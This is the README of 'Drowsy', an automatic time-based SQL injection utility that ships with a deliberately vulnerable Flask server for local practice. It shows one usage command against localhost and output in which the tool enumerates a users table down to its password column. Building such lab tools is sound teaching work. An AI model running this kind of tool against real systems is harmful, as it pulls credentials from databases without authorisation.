# Drowsy
Automatic Time-Based SQL Injection Utility **Vulnerable Server Included**

The vulnerable server is a Flask implimentation with blueprints.

---

For additional help on setting up the vulnerable server in your local Linux environment, see the [README](vulnerable/README.md) in the vulnerable folder.

---

Example Usage:

```bash

python drowsy.py -u http://localhost:5000/search-post -q 'id=^INJECT^' -m POST

# [*] Benchmarking: 169328
# [1 of 4] (169328) users --> id                    
# [2 of 4] (169328) users --> first_name                    
# [3 of 4] (169328) users --> last_name                    
# [4 of 4] (169328) users --> password

```

---

**This application was designed for educational purposes ONLY.  I am not responsible for any misuse that the application may cause.**
